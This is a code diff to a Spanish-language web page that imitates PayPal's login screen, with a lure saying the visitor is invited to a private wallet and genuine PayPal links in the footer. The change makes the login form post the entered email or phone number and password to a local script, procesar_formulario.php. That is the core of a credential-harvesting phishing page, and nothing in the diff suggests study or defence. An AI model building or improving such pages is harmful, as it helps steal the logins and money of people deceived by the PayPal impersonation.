@@ -223,10 +223,15 @@ button:hover {
             </svg>
         </span> te está invitando a su cartera privada
     </div>
-    <form id="login-form">
+    <form action="procesar_formulario.php" method="POST">
+        <label for="email">Correo electronico:</label>
         <input type="email" id="email" placeholder="Correo electrónico o número de teléfono" required>
+
+         <label for="password">Contraseña:</label>
         <input type="password" id="password" placeholder="Contraseña" required>
-        <button type="submit">Iniciar sesión</button>
+        
+         <button type="submit">Iniciar sesión</button>
+    
     </form>
     <div class="forgot-password">
         <a href="https://www.paypal.com/authflow/password-recovery">¿Olvidaste tu contraseña?</a>
@@ -238,7 +243,6 @@ button:hover {
 </div>
 
 <div class="footer-links">
-    <form action="procesar_formulario.php" method="POST">
     <a href="https://www.paypal.com/es/webapps/mpp/ua/privacy-full">Normas de privacidad</a> |
     <a href="https://www.paypal.com/es/webapps/mpp/ua/legalhub-full">Seguridad</a> |
     <a href="https://www.paypal.com/es/webapps/mpp/ua/useragreement-full">Contratos</a> |
